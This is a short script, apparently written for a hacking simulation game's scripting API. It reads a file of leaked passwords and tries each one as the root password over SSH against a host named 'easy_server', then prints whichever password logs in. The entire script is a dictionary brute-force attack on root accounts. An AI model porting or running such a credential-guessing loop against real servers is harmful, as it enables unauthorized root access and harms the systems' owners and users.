d = fs.read("leaked_password.txt")
longText = d.text.replace("\r\n", "\n")
lines = longText.split("\n")
success = false
for each_word in lines
  result = ssh.connect("easy_server", "root", each_word)
  if result != null and result.ok == 1 then
    print each_word
    success = true
    break
  end if
end for
if not success then
  print "Failed.."
end if